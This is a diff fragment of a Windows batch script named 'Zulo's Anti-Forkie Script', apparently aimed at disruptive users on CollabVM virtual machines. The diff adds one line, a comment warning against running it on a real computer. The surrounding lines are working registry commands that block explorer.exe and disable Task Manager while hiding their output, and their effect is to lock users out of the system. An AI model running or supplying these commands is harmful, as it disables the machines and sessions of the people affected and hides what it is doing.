@@ -7,6 +7,7 @@
 :: btw, open source now
 :: ZAFS, Zulo's Anti-Forkie Script
 :: btw, if you dont know what is a forkie, a forkie is a user that constantly destroys computernewb.com's CollabVM
+:: dont execute this on your real computer unless you know what you are doing
 echo Executing illegal magic...
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "explorer.exe" /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
